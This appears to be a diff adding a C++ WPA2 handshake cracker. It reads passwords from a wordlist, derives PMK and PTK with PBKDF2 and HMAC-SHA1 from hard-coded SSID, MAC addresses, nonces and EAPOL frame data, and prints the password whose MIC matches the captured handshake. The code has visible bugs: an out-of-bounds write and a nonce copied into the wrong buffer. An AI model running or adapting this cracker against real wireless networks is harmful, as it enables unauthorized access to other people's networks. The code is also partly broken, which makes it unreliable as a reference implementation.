@@ -1,0 +1,144 @@
+#include<iostream>
+#include<stdio.h>
+#include<string.h>
+#include<thread>
+#include<vector>
+#include"cipher_h/pbkdf2_hmac.h"
+#include"cipher_h/hmac.h"
+#include"read.h"
+#include"compute.h"
+
+int passwd_number = 0;
+char stop = 0;
+unsigned char min_Mac[6] = { 0 }, max_Mac[6] = { 0 }, min_Nonce[32] = { 0 }, max_Nonce[32] = { 0 };
+unsigned char pmk[32] = { 0 }, ptk_data[100] = { 0 }, ptk[20] = { 0 }, mic[16] = { 0 }, data_mic[33] = { 0x84,0x1e,0x91,0x8d,0xc1,0xf4,0x04,0x05,0x44,0x64,0xdd,0xff,0x02,0xc6,0x4b,0x4a };
+unsigned char label[] = { "Pairwise key expansion" };
+char passwd_mark[1] = { 0 };
+char passwd_char[5000][63];
+char hex_out[512] = { 0 };//测试
+//const unsigned char ceshi_ptkdata[1] = { 0x00 };
+
+char* read() {
+	if (passwd_number==5001)
+	{
+		passwd_number = 0;
+		read_passwd();
+	}
+	return passwd_char[passwd_number++];
+}
+char compare() {
+	if (memcmp(mic, data_mic, 16)==0) {
+		return passwd_mark[1]='y';
+	}
+	else {
+		return passwd_mark[1]='n';
+	}
+}
+void mac_nonce_compare_create_data(//比较排序，构建ptk输入数据
+	unsigned char* anonce,
+	unsigned char* snonce,
+	unsigned char* amac,
+	unsigned char* smac) {
+	if (memcmp(amac, smac, 6)<=0)
+	{
+		memcpy(ptk_data + 23, amac, 6);
+		memcpy(ptk_data + 29, smac, 6);
+	}
+	else
+	{
+		memcpy(ptk_data + 29, amac, 6);
+		memcpy(ptk_data + 23, smac, 6);
+	}
+	if (memcmp(anonce, snonce, 32) <= 0)
+	{
+		memcpy(ptk_data + 35, anonce, 32);
+		memcpy(ptk_data + 67, snonce, 32);
+	}
+	else
+	{
+		memcpy(max_Nonce, anonce, 32);
+		memcpy(ptk_data + 67 + 35, snonce, 32);
+	}
+	memcpy(ptk_data, label, 23);
+	
+}
+void bin2hex(unsigned char* in, char* out) {
+	const char hex[] = "0123456789ABCDEF";
+	for (int i = 0; i < 32; i++) {
+		out[2 * i] = hex[(in[i] >> 4) & 0x0F];  
+		out[2 * i + 1] = hex[in[i] & 0x0F];     
+	}
+	out[32] = '\0'; 
+}
+void main_compute(unsigned char* passwd,
+	int passwd_size,
+	unsigned char* ssid,
+	int ssid_len,
+	unsigned char* ptk_data,
+	unsigned char* eapol_data) {
+	PKCS5_PBKDF2_HMAC(passwd, passwd_size, ssid, ssid_len, 4096, 32, pmk);
+	ptk_data[99] = 0x00;//计数器，只要一遍
+	hmac_sha1(pmk, 32, ptk_data, 100, ptk);
+	hmac_sha1(ptk, 16, eapol_data, 123, mic);
+	//bin2hex(mic, hex_out);
+	//printf(hex_out);
+}
+void compute() {
+	unsigned char ssid[] = { 0x6f,0x6e,0x65,0x70,0x6c,0x75,0x73,0x20,0x32};//ssid名称转ASCII后的16进制字节
+	unsigned char amac[] = { 0xb6,0x76,0xd8,0x5e,0x01,0x4b };//ap的mac地址
+	unsigned char smac[] = { 0xd4,0xd8,0x53,0xff,0x3e,0x12 };//sta的mac地址
+	unsigned char anonce[] =
+	{ 0x57,0xe4,0x72,0xc2,0x6e,0x84,0xc2,0xf9
+	,0xb3,0x21,0x41,0xe6,0x9b,0x08,0x36,0x0c
+	,0x17,0x73,0x3d,0x1d,0xaf,0xf1,0x01,0x44
+	,0x76,0x88,0x42,0x82,0x68,0xee,0x6e,0x96 };//ap的随机数，第一步握手
+	unsigned char snonce[] =
+	{ 0xdc,0xeb,0x5f,0x99,0xc9,0x37,0x4e,0xe0
+	,0xbd,0x00,0x75,0xcd,0xd7,0x43,0x3a,0xd5
+	,0xb9,0x06,0x5e,0x05,0xf1,0x13,0xe2,0x24
+	,0xed,0x52,0x6b,0xb1,0x62,0x05,0x30,0x62 };//sta的随机数，第二步握手
+	unsigned char eapol_data[] =
+	{ 0x01,0x03,0x00,0x77,0x02,0x01,0x0a,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+		0x01,0xdc,0xeb,0x5f,0x99,0xc9,0x37,0x4e,0xe0,0xbd,0x00,0x75,0xcd,0xd7,0x43,0x3a,
+		0xd5,0xb9,0x06,0x5e,0x05,0xf1,0x13,0xe2,0x24,0xed,0x52,0x6b,0xb1,0x62,0x05,0x30,
+		0x62,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+		0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+		0x00,0x00,0x18,0x30,0x16,0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac,
+		0x04,0x01,0x00,0x00,0x0f,0xac,0x02,0x3c,0x00,0x00,0x00
+	};//在802.1X Authentication栏中的数据，mic字段置零
+	mac_nonce_compare_create_data(anonce, snonce, amac, smac);//先比较，拼数据
+	int ssid_len = sizeof(ssid);//转ssid长度
+	int passwd_size = 0;
+	read_passwd();
+	while (	compare()!='y') {
+		char* finish =read() ;
+		//printf(read());//测试
+		//printf("\n");
+		passwd_size = strlen(finish);//密码输入,长度计算
+		main_compute((unsigned char*)finish, passwd_size,ssid,ssid_len, ptk_data,eapol_data);//进行主计算
+		if (compare() == 'y')
+		{
+			printf(finish);
+			return;
+		}
+	}
+	
+}
+//void create_thread() {
+//	int* a= &passwd_number;
+//	read_passwd();
+//	//compute();
+//	std::vector<std::thread> thread_compute;
+//	for (size_t i = 0; i < 16; i++)//16换成处理器数量
+//	{
+//		thread_compute.emplace_back(compute);
+//	}
+//	if (stop==1)
+//	{
+//		for (size_t i = 0; i < 16; i++)//16换成处理器数量
+//		{
+//			thread_compute[i].join();
+//		}
+//	}
+//}
